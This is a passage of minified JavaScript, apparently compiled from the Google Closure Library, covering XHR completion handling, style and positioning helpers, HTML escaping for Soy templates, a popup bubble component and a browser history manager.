var PS_od=function(a){if(a.b&&"undefined"!=typeof PS_aa)if(a.o[1]&&4==PS_pd(a)&&2==PS_qd(a))PS_T(a.F,PS_V(a,"Local request error detected and ignored"));else if(a.h&&4==PS_pd(a))PS_Mb(a.K,0,a);else if(PS_B(a,"readystatechange"),4==PS_pd(a)){PS_T(a.F,PS_V(a,"Request complete"));a.b=!1;try{var b=PS_qd(a),c;a:switch(b){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:c=!0;break a;default:c=!1}var d;if(!(d=c)){var e;if(e=0===b){var f=String(a.i).match(PS_6c)[1]||null;if(!f&&PS_b.self&&
PS_b.self.location)var g=PS_b.self.location.protocol,f=g.substr(0,g.length-1);e=!PS_ed.test(f?f.toLowerCase():"")}d=e}if(d)PS_B(a,"complete"),PS_B(a,"success");else{var h;try{h=2<PS_pd(a)?a.a.statusText:""}catch(l){PS_T(a.F,"Can not get status: "+l.message),h=""}a.f=h+" ["+PS_qd(a)+"]";PS_nd(a)}}finally{PS_md(a)}}},PS_md=function(a,b){if(a.a){PS_kd(a);var c=a.a,d=a.o[0]?PS_ba:null;a.a=null;a.o=null;b||PS_B(a,"ready");try{c.onreadystatechange=d}catch(e){(c=a.F)&&c.log(PS__c,"Problem encountered resetting onreadystatechange: "+
e.message,void 0)}}},PS_kd=function(a){a.a&&a.l&&(a.a.ontimeout=null);PS_g(a.j)&&(PS_b.clearTimeout(a.j),a.j=null)},PS_pd=function(a){return a.a?a.a.readyState:0},PS_qd=function(a){try{return 2<PS_pd(a)?a.a.status:-1}catch(b){return-1}},PS_V=function(a,b){return b+" ["+a.J+" "+a.i+" "+PS_qd(a)+"]"};var PS_rd=function(){return PS_v?"Webkit":PS_u?"Moz":PS_t?"ms":PS_s?"O":null},PS_sd=function(){return PS_v?"-webkit":PS_u?"-moz":PS_t?"-ms":PS_s?"-o":null};var PS_W=function(a,b,c,d){this.top=a;this.right=b;this.bottom=c;this.left=d};PS_W.prototype.clone=function(){return new PS_W(this.top,this.right,this.bottom,this.left)};PS_W.prototype.toString=function(){return"("+this.top+"t, "+this.right+"r, "+this.bottom+"b, "+this.left+"l)"};PS_W.prototype.contains=function(a){return this&&a?a instanceof PS_W?a.left>=this.left&&a.right<=this.right&&a.top>=this.top&&a.bottom<=this.bottom:a.x>=this.left&&a.x<=this.right&&a.y>=this.top&&a.y<=this.bottom:!1};
PS_W.prototype.round=function(){this.top=Math.round(this.top);this.right=Math.round(this.right);this.bottom=Math.round(this.bottom);this.left=Math.round(this.left);return this};var PS_X=function(a,b,c,d){this.left=a;this.top=b;this.width=c;this.height=d};PS_X.prototype.clone=function(){return new PS_X(this.left,this.top,this.width,this.height)};PS_X.prototype.toString=function(){return"("+this.left+", "+this.top+" - "+this.width+"w x "+this.height+"h)"};
PS_X.prototype.contains=function(a){return a instanceof PS_X?this.left<=a.left&&this.left+this.width>=a.left+a.width&&this.top<=a.top&&this.top+this.height>=a.top+a.height:a.x>=this.left&&a.x<=this.left+this.width&&a.y>=this.top&&a.y<=this.top+this.height};PS_X.prototype.round=function(){this.left=Math.round(this.left);this.top=Math.round(this.top);this.width=Math.round(this.width);this.height=Math.round(this.height);return this};var PS_Y=function(a,b,c){if(PS_f(b))(b=PS_td(a,b))&&(a.style[b]=c);else for(var d in b){c=a;var e=b[d],f=PS_td(c,d);f&&(c.style[f]=e)}},PS_ud={},PS_td=function(a,b){var c=PS_ud[b];if(!c){var d=PS_wa(b),c=d;void 0===a.style[d]&&(d=PS_rd()+PS_xa(d),void 0!==a.style[d]&&(c=d));PS_ud[b]=c}return c},PS_Z=function(a,b){var c=PS_M(a);return c.defaultView&&c.defaultView.getComputedStyle&&(c=c.defaultView.getComputedStyle(a,null))?c[b]||c.getPropertyValue(b)||"":""},PS__=function(a,b){return PS_Z(a,b)||(a.currentStyle?
a.currentStyle[b]:null)||a.style&&a.style[b]},PS_wd=function(a,b,c){var d;b instanceof PS_K?(d=b.x,b=b.y):(d=b,b=c);a.style.left=PS_vd(d);a.style.top=PS_vd(b)},PS_xd=function(a){var b;try{b=a.getBoundingClientRect()}catch(c){return{left:0,top:0,right:0,bottom:0}}PS_t&&a.ownerDocument.body&&(a=a.ownerDocument,b.left-=a.documentElement.clientLeft+a.body.clientLeft,b.top-=a.documentElement.clientTop+a.body.clientTop);return b},PS_yd=function(a){if(PS_t&&!(8<=PS_x))return a.offsetParent;var b=PS_M(a),
c=PS__(a,"position"),d="fixed"==c||"absolute"==c;for(a=a.parentNode;a&&a!=b;a=a.parentNode)if(11==a.nodeType&&a.host&&(a=a.host),c=PS__(a,"position"),d=d&&"static"==c&&a!=b.documentElement&&a!=b.body,!d&&(a.scrollWidth>a.clientWidth||a.scrollHeight>a.clientHeight||"fixed"==c||"absolute"==c||"relative"==c))return a;return null},PS_Ad=function(a){for(var b=new PS_W(0,Infinity,Infinity,0),c=PS_N(a),d=c.a.body,e=c.a.documentElement,f=PS_yc(c.a);a=PS_yd(a);)if(!(PS_t&&0==a.clientWidth||PS_v&&0==a.clientHeight&&
a==d)&&a!=d&&a!=e&&"visible"!=PS__(a,"overflow")){var g=PS_zd(a),h=new PS_K(a.clientLeft,a.clientTop);g.x+=h.x;g.y+=h.y;b.top=Math.max(b.top,g.y);b.right=Math.min(b.right,g.x+a.clientWidth);b.bottom=Math.min(b.bottom,g.y+a.clientHeight);b.left=Math.max(b.left,g.x)}d=f.scrollLeft;f=f.scrollTop;b.left=Math.max(b.left,d);b.top=Math.max(b.top,f);c=(PS_zc(c.a)||window).document;c="CSS1Compat"==c.compatMode?c.documentElement:c.body;c=new PS_L(c.clientWidth,c.clientHeight);b.right=Math.min(b.right,d+c.width);
b.bottom=Math.min(b.bottom,f+c.height);return 0<=b.top&&0<=b.left&&b.bottom>b.top&&b.right>b.left?b:null},PS_zd=function(a){var b=PS_M(a);PS_Ba(a,"Parameter is required");var c=new PS_K(0,0),d;d=b?PS_M(b):document;var e;(e=!PS_t)||(e=9<=PS_x);d=e||PS_Ic(PS_N(d))?d.documentElement:d.body;if(a==d)return c;a=PS_xd(a);b=PS_N(b);b=PS_Ac(b.a);c.x=a.left+b.x;c.y=a.top+b.y;return c},PS_Cd=function(a,b){var c=PS_Bd(a),d=PS_Bd(b);return new PS_K(c.x-d.x,c.y-d.y)},PS_Dd=function(a){a=PS_xd(a);return new PS_K(a.left,
a.top)},PS_Bd=function(a){PS_o(a);if(1==a.nodeType)return PS_Dd(a);a=a.changedTouches?a.changedTouches[0]:a;return new PS_K(a.clientX,a.clientY)},PS_vd=function(a){"number"==typeof a&&(a=a+"px");return a},PS_Fd=function(a){var b=PS_Ed;if("none"!=PS__(a,"display"))return b(a);var c=a.style,d=c.display,e=c.visibility,f=c.position;c.visibility="hidden";c.position="absolute";c.display="inline";a=b(a);c.display=d;c.position=f;c.visibility=e;return a},PS_Ed=function(a){var b=a.offsetWidth,c=a.offsetHeight,
d=PS_v&&!b&&!c;return PS_c(b)&&!d||!a.getBoundingClientRect?new PS_L(b,c):(a=PS_xd(a),new PS_L(a.right-a.left,a.bottom-a.top))},PS_Gd=function(a){var b=PS_zd(a);a=PS_Fd(a);return new PS_X(b.x,b.y,a.width,a.height)},PS_Hd=function(a,b){PS_o(a);var c=a.style;"opacity"in c?c.opacity=b:"MozOpacity"in c?c.MozOpacity=b:"filter"in c&&(c.filter=""===b?"":"alpha(opacity="+100*b+")")},PS_0=function(a,b){a.style.display=b?"":"none"},PS_Id=function(a,b){if(/^\d+px?$/.test(b))return parseInt(b,10);var c=a.style.left,
d=a.runtimeStyle.left;a.runtimeStyle.left=a.currentStyle.left;a.style.left=b;var e=a.style.pixelLeft;a.style.left=c;a.runtimeStyle.left=d;return e},PS_Jd=function(a,b){var c=a.currentStyle?a.currentStyle[b]:null;return c?PS_Id(a,c):0},PS_Kd=function(a,b){if(PS_t){var c=PS_Jd(a,b+"Left"),d=PS_Jd(a,b+"Right"),e=PS_Jd(a,b+"Top"),f=PS_Jd(a,b+"Bottom");return new PS_W(e,d,f,c)}c=PS_Z(a,b+"Left");d=PS_Z(a,b+"Right");e=PS_Z(a,b+"Top");f=PS_Z(a,b+"Bottom");return new PS_W(parseFloat(e),parseFloat(d),parseFloat(f),
parseFloat(c))},PS_Ld={thin:2,medium:4,thick:6},PS_Md=function(a,b){if("none"==(a.currentStyle?a.currentStyle[b+"Style"]:null))return 0;var c=a.currentStyle?a.currentStyle[b+"Width"]:null;return c in PS_Ld?PS_Ld[c]:PS_Id(a,c)},PS_Nd=/matrix\([0-9\.\-]+, [0-9\.\-]+, [0-9\.\-]+, [0-9\.\-]+, ([0-9\.\-]+)p?x?, ([0-9\.\-]+)p?x?\)/;var PS_Od=function(a){return(a=a.exec(PS_r))?a[1]:""},PS_Pd=function(){if(PS_Ub)return PS_Od(/Firefox\/([0-9.]+)/);if(PS_t||PS_Za||PS_s)return PS_4a;if(PS_Yb)return PS_Od(/Chrome\/([0-9.]+)/);if(PS_Zb&&!(PS_Ya()||PS_("iPad")||PS_("iPod")))return PS_Od(/Version\/([0-9.]+)/);if(PS_Vb||PS_Wb){var a;if(a=/Version\/(\S+).*Mobile\/(\S+)/.exec(PS_r))return a[1]+"."+a[2]}else if(PS_Xb)return(a=PS_Od(/Android\s+([0-9.]+)/))?a:PS_Od(/Version\/([0-9.]+)/);return""}();var PS_Qd=PS_Cb(function(){return!PS_t||0<=PS_va(PS_Pd,9)}),PS_Rd=PS_Cb(function(){return PS_v||PS_Za||PS_u&&0<=PS_va(PS_Pd,10)||PS_t&&0<=PS_va(PS_Pd,10)}),PS_Sd=PS_Cb(function(){return PS_t&&9==PS_x?"-ms-transform":"transform"});var PS_Td=function(){PS_A.call(this);this.a=0};PS_k(PS_Td,PS_A);var PS_Ud=function(a,b){PS_e(b)||(b=[b]);PS_o(0<b.length,"At least one Css3Property should be specified.");var c=PS_Ja(b,function(a){if(PS_f(a))return a;PS_Ba(a,"Expected css3 property to be an object.");var b=a.Da+" "+a.duration+"s "+a.timing+" "+a.va+"s";PS_o(a.Da&&PS_g(a.duration)&&a.timing&&PS_g(a.va),"Unexpected css3 property value: %s",b);return b});PS_Y(a,"transition",c.join(","))},PS_Vd=PS_Cb(function(){if(PS_t)return PS_w("10.0");var a=document.createElement("DIV"),b=PS_sd(),c={transition:"opacity 1s linear"};
b&&(c[b+"-transition"]="opacity 1s linear");b=PS_mc("div",{style:c});a.innerHTML=PS_I(b);a=a.firstChild;PS_o(a.nodeType==Node.ELEMENT_NODE);b=a.style[PS_wa("transition")];return""!=("undefined"!==typeof b?b:a.style[PS_td(a,"transition")]||"")});var PS_Wd=function(a,b,c,d,e){PS_Td.call(this);this.b=a;this.h=b;this.i=c;this.f=d;this.l=PS_e(e)?e:[e]};PS_k(PS_Wd,PS_Td);var PS_Xd=function(a){1!=a.a&&(PS_B(a,"begin"),PS_B(a,"play"),PS_j(),a.a=1,PS_Vd()?(PS_Y(a.b,a.i),a.g=PS_Mb(a.j,void 0,a)):a.c(!1))};PS_Wd.prototype.j=function(){PS_Fd(this.b);PS_Ud(this.b,this.l);PS_Y(this.b,this.f);this.g=PS_Mb(PS_i(this.c,this,!1),1E3*this.h)};
PS_Wd.prototype.c=function(a){PS_Y(this.b,"transition","");PS_b.clearTimeout(this.g);PS_Y(this.b,this.f);PS_j();this.a=0;a?PS_B(this,"stop"):PS_B(this,"finish");PS_B(this,"end")};PS_Wd.prototype.m=function(){1==this.a&&this.c(!0);PS_Wd.A.m.call(this)};var PS_Yd=function(a,b,c,d){return new PS_Wd(a,.218,{opacity:c},{opacity:d},{Da:"opacity",duration:.218,timing:b,va:0})};var PS_Zd={Za:!0},PS__d={$a:!0},PS_0d=function(){throw Error("Do not instantiate directly");};PS_0d.prototype.a=null;PS_0d.prototype.toString=function(){return this.ea};var PS_1d=function(a){if(!PS_h(a))return String(a);if(a instanceof PS_0d){if(a.ca===PS_Zd)return PS_Aa(a.ea);if(a.ca===PS__d)return PS_n(a.ea)}PS_p("Soy template output is unsafe for use as HTML: "+a);return"zSoyz"},PS_2d=/^<(body|caption|col|colgroup|head|html|tr|td|th|tbody|thead|tfoot)>/i,PS_3d={};var PS_1=function(){};PS_1.b=function(){return PS_1.a?PS_1.a:PS_1.a=new PS_1};PS_1.prototype.a=0;var PS_2=function(a){PS_A.call(this);this.f=a||PS_N();this.o=null;this.M=!1;this.a=null;this.c=void 0;this.i=this.j=this.g=null};PS_k(PS_2,PS_A);PS_2.prototype.v=PS_1.b();PS_2.prototype.H=function(){return this.a};var PS_4d=function(a){a.c||(a.c=new PS_R(a));return a.c};PS_2.prototype.I=function(a){if(this.g&&this.g!=a)throw Error("Method not supported");PS_2.A.I.call(this,a)};PS_2.prototype.ya=function(){this.a=this.f.a.createElement("DIV")};
PS_2.prototype.ja=function(){this.M=!0;PS_5d(this,function(a){!a.M&&a.H()&&a.ja()})};var PS_6d=function(a){PS_5d(a,function(a){a.M&&PS_6d(a)});a.c&&PS_Qc(a.c);a.M=!1};PS_2.prototype.m=function(){this.M&&PS_6d(this);this.c&&(this.c.S(),delete this.c);PS_5d(this,function(a){a.S()});this.a&&PS_Dc(this.a);this.g=this.a=this.i=this.j=null;PS_2.A.m.call(this)};PS_2.prototype.wa=function(){return this.a};var PS_5d=function(a,b){a.j&&PS_q(a.j,b,void 0)};
PS_2.prototype.removeChild=function(a,b){if(a){var c=PS_f(a)?a:a.o||(a.o=":"+(a.v.a++).toString(36)),d;this.i&&c?(d=this.i,d=(null!==d&&c in d?d[c]:void 0)||null):d=null;a=d;if(c&&a){d=this.i;c in d&&delete d[c];PS_Na(this.j,a);b&&(PS_6d(a),a.a&&PS_Dc(a.a));c=a;if(null==c)throw Error("Unable to set parent component");c.g=null;PS_2.A.I.call(c,null)}}if(!a)throw Error("Child is not in parent component");return a};var PS_7d=function(a,b){return(b&4&&"rtl"==PS__(a,"direction")?b^2:b)&-5};var PS_3=function(a,b){PS_A.call(this);this.a=new PS_R(this);var c=a||null;PS_8d(this);this.B=c;b&&(this.aa=b)};PS_k(PS_3,PS_A);PS_a=PS_3.prototype;PS_a.B=null;PS_a.ta=null;PS_a.N=!1;PS_a.pa=-1;PS_a.aa="toggle_display";PS_a.H=function(){return this.B};var PS_8d=function(a){if(a.N)throw Error("Can not change this state of the popup while showing.");};PS_3.prototype.b=PS_ba;
var PS_9d=function(a,b){a.N&&PS_B(a,{type:"beforehide",target:b})&&(a.a&&PS_Qc(a.a),a.N=!1,PS_j(),a.c?(PS_wb(a.c,"end",PS_ha(a.ua,b),!1,a),PS_Xd(a.c)):a.ua(b))};PS_a=PS_3.prototype;PS_a.ua=function(a){"toggle_display"==this.aa?this.Ta():"move_offscreen"==this.aa&&(this.B.style.top="-10000px");PS_B(this,{type:"hide",target:a})};PS_a.Ta=function(){this.B.style.visibility="hidden";PS_0(this.B,!1)};PS_a.za=function(){PS_B(this,"show")};
PS_a.Ca=function(a){a=a.target;PS_Fc(this.B,a)||PS_$d(this,a)||150>PS_j()-this.pa||PS_9d(this,a)};PS_a.Ba=function(a){var b=PS_M(this.B);if("undefined"!=typeof document.activeElement){if(a=b.activeElement,!a||PS_Fc(this.B,a)||"BODY"==a.tagName)return}else if(a.target!=b)return;150>PS_j()-this.pa||PS_9d(this)};var PS_$d=function(a,b){return PS_Ka(a.ta||[],function(a){return b===a||PS_Fc(a,b)})};
PS_3.prototype.m=function(){PS_3.A.m.call(this);this.a.S();PS_ia(this.f);PS_ia(this.c);delete this.B;delete this.a;delete this.ta};var PS_ae=function(a,b){this.g=b||void 0;PS_3.call(this,a)};PS_k(PS_ae,PS_3);PS_ae.prototype.b=function(){if(this.g){var a=!this.N&&"move_offscreen"!=this.aa,b=this.H();a&&(b.style.visibility="hidden",PS_0(b,!0));this.g.L(b,4,this.h);a&&PS_0(b,!1)}};var PS_be=function(){};PS_be.prototype.L=function(){};var PS_ce=function(a,b){this.c=a;this.i=!!b;this.f={0:this.c+"-arrowright",1:this.c+"-arrowup",2:this.c+"-arrowdown",3:this.c+"-arrowleft"}};PS_k(PS_ce,PS_be);PS_ce.prototype.h=20;PS_ce.prototype.g=-5;
PS_ce.prototype.L=function(a,b,c){PS_o(this.D,"Must call setElements first.");a=2;2==a&&(a=0);b=this.b.offsetHeight/2;if(this.a){var d=PS_de(3,a),e=this.a;var f=PS_Fd(e).height/2-b,g=PS_7d(e,d),h;if(h=PS_Ad(e))e=PS_Gd(e),e=new PS_W(e.top,e.left+e.width,e.top+e.height,e.left),e.top<h.top&&!(g&1)?f-=h.top-e.top:e.bottom>h.bottom&&g&1&&(f-=e.bottom-h.bottom);g=new PS_K(this.g,f);f=0;"rtl"==this.a.dir&&(f=3);h=this.a;e=PS_de(f,a);f=this.b;PS_o(f);var l,k=f.offsetParent;if(k){var m="HTML"==k.tagName||
"BODY"==k.tagName;m&&"static"==PS__(k,"position")||(l=PS_zd(k),m||(m=(m="rtl"==PS__(k,"direction"))&&PS_u?-k.scrollLeft:!m||PS__a&&PS_w("8")||"visible"==PS__(k,"overflowX")?k.scrollLeft:k.scrollWidth-k.clientWidth-k.scrollLeft,l=PS_pc(l,new PS_K(m,k.scrollTop))))}l=l||new PS_K;k=PS_Gd(h);if(m=PS_Ad(h)){var n=new PS_X(m.left,m.top,m.right-m.left,m.bottom-m.top),m=Math.max(k.left,n.left),p=Math.min(k.left+k.width,n.left+n.width);if(m<=p){var q=Math.max(k.top,n.top),n=Math.min(k.top+k.height,n.top+n.height);
q<=n&&(k.left=m,k.top=q,k.width=p-m,k.height=n-q)}}m=PS_N(h);q=PS_N(f);if(m.a!=q.a){p=m.a.body;var q=PS_zc(q.a),n=new PS_K(0,0),r=PS_Bc(PS_M(p));if(PS_Ga(r,"parent")){var t=p;do{var u=r==q?PS_zd(t):PS_Dd(PS_o(t));n.x+=u.x;n.y+=u.y}while(r&&r!=q&&r!=r.parent&&(t=r.frameElement)&&(r=r.parent))}p=PS_pc(n,PS_zd(p));!PS_t||9<=PS_x||PS_Ic(m)||(p=PS_pc(p,PS_Ac(m.a)));k.left+=p.x;k.top+=p.y}h=PS_7d(h,e);e=new PS_K(h&2?k.left+k.width:k.left,h&1?k.top+k.height:k.top);e=PS_pc(e,l);g&&(e.x+=(h&2?-1:1)*g.x,e.y+=
(h&1?-1:1)*g.y);h=e.clone();g=PS_7d(f,d);d=PS_Fd(f);e=d.clone();h=h.clone();e=e.clone();if(c||0!=g)g&2?h.x-=e.width+(c?c.right:0):c&&(h.x+=c.left),g&1?h.y-=e.height+(c?c.bottom:0):c&&(h.y+=c.top);c=new PS_X(0,0,0,0);c.left=h.x;c.top=h.y;c.width=e.width;c.height=e.height;PS_wd(f,new PS_K(c.left,c.top));e=new PS_L(c.width,c.height);d==e||d&&e&&d.width==e.width&&d.height==e.height||(c=e,d=PS_M(f),g=PS_Ic(PS_N(d)),!PS_t||PS_w("10")||g&&PS_w("8")?(f=f.style,PS_u?f.MozBoxSizing="border-box":PS_v?f.WebkitBoxSizing=
"border-box":f.boxSizing="border-box",f.width=Math.max(c.width,0)+"px",f.height=Math.max(c.height,0)+"px"):(d=f.style,g?(g=PS_Kd(f,"padding"),!PS_t||9<=PS_x?(h=PS_Z(f,"borderLeftWidth"),e=PS_Z(f,"borderRightWidth"),l=PS_Z(f,"borderTopWidth"),f=PS_Z(f,"borderBottomWidth"),f=new PS_W(parseFloat(l),parseFloat(e),parseFloat(f),parseFloat(h))):(h=PS_Md(f,"borderLeft"),e=PS_Md(f,"borderRight"),l=PS_Md(f,"borderTop"),f=PS_Md(f,"borderBottom"),f=new PS_W(l,e,f,h)),d.pixelWidth=c.width-f.left-g.left-g.right-
f.right,d.pixelHeight=c.height-f.top-g.top-g.bottom-f.bottom):(d.pixelWidth=c.width,d.pixelHeight=c.height)));this.i&&(c=parseFloat(this.b.style.left),f=parseFloat(this.b.style.top),PS_o(!isNaN(c)&&!isNaN(f),"Could not parse position."),isFinite(c)&&0==c%1&&isFinite(f)&&0==f%1||PS_wd(this.b,Math.round(c),Math.round(f)))}PS_ee(this,a,b)};
var PS_ee=function(a,b,c){var d=a.D;PS_Oa(a.f,function(a){PS_D(d,a,!1)},a);PS_Rb(d,a.f[3]);d.style.top=d.style.left=d.style.right=d.style.bottom="";a.a?(b=PS_Cd(a.a,a.b),c=PS_fe(a.a),d.style.top=PS_ge(b.y+c.y,a.b.offsetHeight-15)+"px"):d.style[0==b?"top":"bottom"]=c+"px"},PS_ge=function(a,b){return 15>b?15:Math.min(Math.max(a,15),b)},PS_de=function(a,b){switch(a){case 2:return 0==b?1:3;case 1:return 0==b?0:2;case 0:return 0==b?6:7;default:return 0==b?4:5}},PS_fe=function(a){var b=0,c=0;a=PS_Fd(a);
b=a.width;c=a.height/2;return new PS_K(b,c)};PS_t&&PS_w(8);var PS_4=function(){PS_0d.call(this)};PS_k(PS_4,PS_0d);PS_4.prototype.ca=PS_Zd;var PS_he=function(a){function b(a){this.ea=a}b.prototype=a.prototype;return function(a,d){var e=new b(String(a));void 0!==d&&(e.a=d);return e}}(PS_4);(function(a){function b(a){this.ea=a}b.prototype=a.prototype;return function(a,d){var e=String(a);if(!e)return"";e=new b(e);void 0!==d&&(e.a=d);return e}})(PS_4);
var PS_me=function(a){return null!=a&&a.ca===PS_Zd?(PS_o(a.constructor===PS_4),a=String(a.ea).replace(PS_ie,"").replace(PS_je,"&lt;"),String(a).replace(PS_ke,PS_le)):PS_n(String(a))},PS_ne={"\x00":"&#0;","\t":"&#9;","\n":"&#10;","\x0B":"&#11;","\f":"&#12;","\r":"&#13;"," ":"&#32;",'"':"&quot;","&":"&amp;","'":"&#39;","-":"&#45;","/":"&#47;","<":"&lt;","=":"&#61;",">":"&gt;","`":"&#96;","\u0085":"&#133;","\u00a0":"&#160;","\u2028":"&#8232;","\u2029":"&#8233;"},PS_le=function(a){return PS_ne[a]},PS_ke=
/[\x00\x22\x27\x3c\x3e]/g,PS_ie=/<(?:!|\/?([a-zA-Z][a-zA-Z0-9:\-]*))(?:[^>'"]|"[^"]*"|'[^']*')*>/g,PS_je=/</g;var PS_oe=function(a){var b='<div class="jfk-bubble" role="alertdialog"'+(a.uid?' aria-describedby="'+PS_me(a.uid)+'"':"")+'><div class="jfk-bubble-content-id"'+(a.uid?' id="'+PS_me(a.uid)+'"':"")+"></div>";a.Va&&(a=b,b="Close".replace(PS_ke,PS_le),b=a+('<div class="jfk-bubble-closebtn-id jfk-bubble-closebtn" aria-label="'+b+'" role="button" tabindex=0></div>'));return PS_he(b+'<div class="jfk-bubble-arrow-id jfk-bubble-arrow"><div class="jfk-bubble-arrowimplbefore"></div><div class="jfk-bubble-arrowimplafter"></div></div></div>')};
PS_oe.a="jfk.templates.bubble.main";var PS_pe=function(a){PS_2.call(this,a);this.h=new PS_ce("jfk-bubble",!0);this.b=new PS_ae;this.u=[]};PS_k(PS_pe,PS_2);PS_pe.prototype.l=!0;
var PS_qe=function(a,b){var c=a.wa();if(b&&c)if(PS_f(b)){var d;d=PS_J(b,null);c.innerHTML=PS_I(d)}else if(b instanceof PS_4){if(b.ca===PS__d)d=PS_hc(b.toString());else{if(b.ca!==PS_Zd)throw Error("Sanitized content was not of kind TEXT or HTML.");var e=PS_4b("Soy SanitizedContent of kind HTML produces SafeHtml-contract-compliant value.");d=b.toString();var f=b.a;PS_Aa(PS_3b(e),"must provide justification");e=PS_3b(e);PS_o(!/^[\s\xa0]*$/.test(e),"must provide non-empty justification");d=PS_J(d,f||
null)}c.innerHTML=PS_I(d)}else b instanceof PS_H?c.innerHTML=PS_I(b):(c.innerHTML=PS_I(PS_oc),c.appendChild(b))};PS_a=PS_pe.prototype;PS_a.wa=function(){return this.a?PS_uc("jfk-bubble-content-id",this.a||this.f.a):null};
PS_a.ya=function(){var a={Va:this.l,uid:"bubble-"+(this[PS_da]||(this[PS_da]=++PS_ea))},b=this.f;PS_o(PS_oe,"Soy template may not be null.");a:{var a=PS_oe(a||PS_3d),b=(b||PS_N()).a.createElement("DIV"),a=PS_1d(a),c=a.match(PS_2d);PS_o(!c,"This template starts with a %s, which cannot be a child of a <div>, as required by soy internals. Consider using goog.soy.renderElement instead.\nTemplate output: %s",c&&c[0],a);b.innerHTML=a;if(1==b.childNodes.length&&(a=b.firstChild,1==a.nodeType)){b=a;break a}}this.a=
b;PS_qe(this,this.s);PS_0(this.H(),!1);b=this.b;a=this.H();PS_8d(b);b.B=a;PS_0a||(b=this.b,a=PS_Yd(this.H(),"ease-out",0,1),c=PS_Yd(this.H(),"ease-in",1,0),b.f=a,b.c=c);PS_Sb(this.H(),this.u)};
PS_a.ja=function(){PS_pe.A.ja.call(this);PS_S(PS_4d(this),this.b,["beforeshow","show","beforehide","hide"],this.Sa);if(this.l){var a=PS_4d(this),b=this.a?PS_uc("jfk-bubble-closebtn-id",this.a||this.f.a):null;PS_Sc(b,PS_ha(this.la,!1),void 0,a.b||a,a)}a=this.H();PS_o(a,"getElement() returns null.");b=this.a?PS_uc("jfk-bubble-arrow-id",this.a||this.f.a):null;PS_o(b,"No arrow element is found!");var c=this.h;c.b=a;c.D=b;a=this.b;a.g=this.h||void 0;a.N&&a.b()};
PS_a.la=function(a){var b=this.b;if(b.f){var c=b.f;1==c.a&&c.c(!0)}b.c&&(c=b.c,1==c.a&&c.c(!0));if(a){if(!b.N&&PS_B(b,"beforeshow")){if(!b.B)throw Error("Caller must call setElement before trying to show the popup");b.b();a=PS_M(b.B);PS_S(b.a,a,"mousedown",b.Ca,!0);if(PS_t){var d;try{d=a.activeElement}catch(f){}for(;d&&"IFRAME"==d.nodeName;){try{var e=PS_Gc(d)}catch(f){break}a=e;d=a.activeElement}PS_S(b.a,a,"mousedown",b.Ca,!0);PS_S(b.a,a,"deactivate",b.Ba)}else PS_S(b.a,a,"blur",b.Ba);"toggle_display"==
b.aa?(b.B.style.visibility="visible",PS_0(b.B,!0)):"move_offscreen"==b.aa&&b.b();b.N=!0;b.pa=PS_j();b.f?(PS_wb(b.f,"end",b.za,!1,b),PS_Xd(b.f)):b.za()}}else PS_9d(b)};PS_a.m=function(){this.b.S();delete this.b;PS_pe.A.m.call(this)};PS_a.Aa=function(){PS_Bd(this.H());return!1};PS_a.Sa=function(a){if("show"==a.type||"hide"==a.type){var b=PS_4d(this),c=this.f,c=PS_t?PS_zc(c.a):c.a;"show"==a.type?PS_S(b,c,"scroll",this.Aa):PS_Pc(b,c,"scroll",this.Aa)}return PS_B(this,a.type)};var PS_re=function(){return!(PS_("iPad")||PS_("Android")&&!PS_("Mobile")||PS_("Silk"))&&(PS_("iPod")||PS_("iPhone")||PS_("Android")||PS_("IEMobile"))};var PS_se=function(a,b){for(var c=[a],d=b.length-1;0<=d;--d)c.push(typeof b[d],b[d]);return c.join("\x0B")};var PS_te=function(){PS_y.call(this,"navigate")};PS_k(PS_te,PS_y);var PS_7=function(a,b,c,d){PS_A.call(this);if(a&&!b)throw Error("Can't use invisible history without providing a blank page.");var e;if(c)e=c;else{e="history_state"+PS_ue;var f=PS_mc("input",{type:"text",name:e,id:e,style:PS_4b("display:none")});document.write(PS_I(f));e=PS_sc(document,e)}this.l=e;this.a=c?PS_Bc(PS_M(c)):window;var g;PS_f(b)?g=PS_fc(b):g=b;this.o=g;PS_t&&!b&&(b="https"==window.location.protocol?PS_4b("https:///"):PS_4b('javascript:""'),this.o=b=PS_fc(PS_3b(b)));this.b=new PS_C(150);
PS_m(this,this.b);this.f=!a;this.c=new PS_R(this);if(a||PS_5){var h;if(d)h=d;else{a="history_iframe"+PS_ue;d={id:a,style:PS_4b("display:none"),sandbox:void 0};b={};b.src=this.o||null;b.srcdoc=null;c={sandbox:""};g={};for(h in b)PS_o(h.toLowerCase()==h,"Must be lower case"),g[h]=b[h];for(h in c)PS_o(h.toLowerCase()==h,"Must be lower case"),g[h]=c[h];for(h in d){e=h.toLowerCase();if(e in b)throw Error('Cannot override "'+e+'" attribute, got "'+h+'" with value "'+d[h]+'"');e in c&&delete g[e];g[h]=d[h]}h=
PS_lc("iframe",g,void 0);document.write(PS_I(h));h=PS_sc(document,a)}this.s=h;this.K=!0}PS_5&&(PS_S(this.c,this.a,"load",this.P),this.J=this.u=!1);this.f?PS_ve(this,PS_6(this),!0):PS_we(this,this.l.value);PS_ue++};PS_k(PS_7,PS_A);PS_7.prototype.j=!1;PS_7.prototype.i=!1;PS_7.prototype.g=null;
var PS_xe=function(a,b){var c=b||PS_se;return function(){var b=this||PS_b,b=b.closure_memoize_cache_||(b.closure_memoize_cache_={}),e=c(a[PS_da]||(a[PS_da]=++PS_ea),arguments);return b.hasOwnProperty(e)?b[e]:b[e]=a.apply(this,arguments)}}(function(){return PS_t?8<=PS_x:"onhashchange"in PS_b}),PS_5=PS_t&&!(8<=PS_x);PS_7.prototype.h=null;PS_7.prototype.m=function(){PS_7.A.m.call(this);this.c.S();PS_ye(this,!1)};
var PS_ye=function(a,b){if(b!=a.j)if(PS_5&&!a.u)a.J=b;else if(b)if(PS_s?PS_S(a.c,a.a.document,PS_ze,a.X):PS_u&&PS_S(a.c,a.a,"pageshow",a.O),PS_xe()&&a.f)PS_S(a.c,a.a,"hashchange",a.U),a.j=!0,PS_B(a,new PS_te(PS_6(a)));else{if(!PS_t||PS_re()||a.u)PS_S(a.c,a.b,"tick",PS_i(a.v,a,!0)),a.j=!0,PS_5||(a.g=PS_6(a),PS_B(a,new PS_te(PS_6(a)))),PS_Kb(a.b)}else a.j=!1,PS_Qc(a.c),PS_Jb(a.b)};PS_7.prototype.P=function(){this.u=!0;this.l.value&&PS_we(this,this.l.value,!0);PS_ye(this,this.J)};
